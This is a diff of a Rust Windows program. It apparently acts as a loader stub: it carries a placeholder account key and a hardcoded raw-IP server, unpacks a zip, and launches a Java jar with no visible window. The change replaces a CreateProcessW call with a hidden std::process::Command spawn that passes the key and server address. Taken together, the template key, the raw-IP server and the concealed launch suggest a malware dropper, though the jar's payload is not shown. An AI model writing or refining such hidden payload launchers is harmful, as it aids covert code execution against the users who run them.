@@ -5,7 +5,9 @@ use std::ffi::OsStr;
 use std::fs;
 use std::io::Write;
 use std::os::windows::ffi::OsStrExt;
+use std::os::windows::process::CommandExt;
 use std::path::{Path, PathBuf};
+use std::process::{Command, Stdio};
 use walkdir::WalkDir;
 
 use windows_sys::Win32::Foundation::*;
@@ -14,6 +16,7 @@ use windows_sys::Win32::Networking::WinInet::*;
 
 const KEY: &str = "__ACCOUNT_KEY__";
 const SERVER: &str = "http://95.182.96.216"; // HARDCODED HERE
+const CREATE_NO_WINDOW: u32 = 0x08000000;
 
 fn to_wide(s: &str) -> Vec<u16> {
     OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
@@ -76,7 +79,7 @@ fn extract_zip(zip_path: &Path, out_dir: &Path, loader: &Path) {
         );
         
         if !pi.hProcess.is_null() {
-            WaitForSingleObject(pi.hProcess, 60000); // Wait up to 60s
+            WaitForSingleObject(pi.hProcess, 60000); 
             CloseHandle(pi.hProcess);
         }
         if !pi.hThread.is_null() { CloseHandle(pi.hThread); }
@@ -167,48 +170,24 @@ fn main() {
         }
     };
 
-    // Use java.exe (console version) to capture errors
     let java_console_exe = java_exe.with_file_name("java.exe");
     log(&loader, &format!("Launching Java with: {:?}", java_console_exe));
 
-    unsafe {
-        let mut si: STARTUPINFOW = std::mem::zeroed();
-        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
-        si.dwFlags = STARTF_USESHOWWINDOW;
-        si.wShowWindow = 0; 
-        
-        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
-        
-        // Redirect output to java_out.txt
-        let cmd_str = format!(
-            "cmd.exe /c \"\"{}\" -jar \"{}\" {} {} > \"{}\\java_out.txt\" 2>&1\"", 
-            java_console_exe.display(), 
-            jar_path.display(), 
-            KEY, 
-            SERVER,
-            loader.display()
-        );
-        let mut cmd_line = to_wide(&cmd_str);
-
-        let success = CreateProcessW(
-            std::ptr::null(), 
-            cmd_line.as_mut_ptr(), 
-            std::ptr::null(), 
-            std::ptr::null(),
-            0, 
-            CREATE_NO_WINDOW, 
-            std::ptr::null(), 
-            std::ptr::null(), 
-            &si, 
-            &mut pi,
-        );
-
-        if success != 0 {
-            log(&loader, "Successfully spawned java.exe. Check java_out.txt for logs.");
-            if !pi.hProcess.is_null() { CloseHandle(pi.hProcess); }
-            if !pi.hThread.is_null() { CloseHandle(pi.hThread); }
-        } else {
-            log(&loader, "CreateProcessW failed");
+    // Native Rust Command for output redirection
+    let out_path = loader.join("java_out.txt");
+    if let Ok(out_file) = fs::File::create(&out_path) {
+        if let Ok(err_file) = out_file.try_clone() {
+            let _ = Command::new(&java_console_exe)
+                .arg("-jar")
+                .arg(&jar_path)
+                .arg(KEY)
+                .arg(SERVER)
+                .stdout(Stdio::from(out_file))
+                .stderr(Stdio::from(err_file))
+                .creation_flags(CREATE_NO_WINDOW)
+                .spawn();
+            
+            log(&loader, "Spawned Java successfully.");
         }
     }
 }
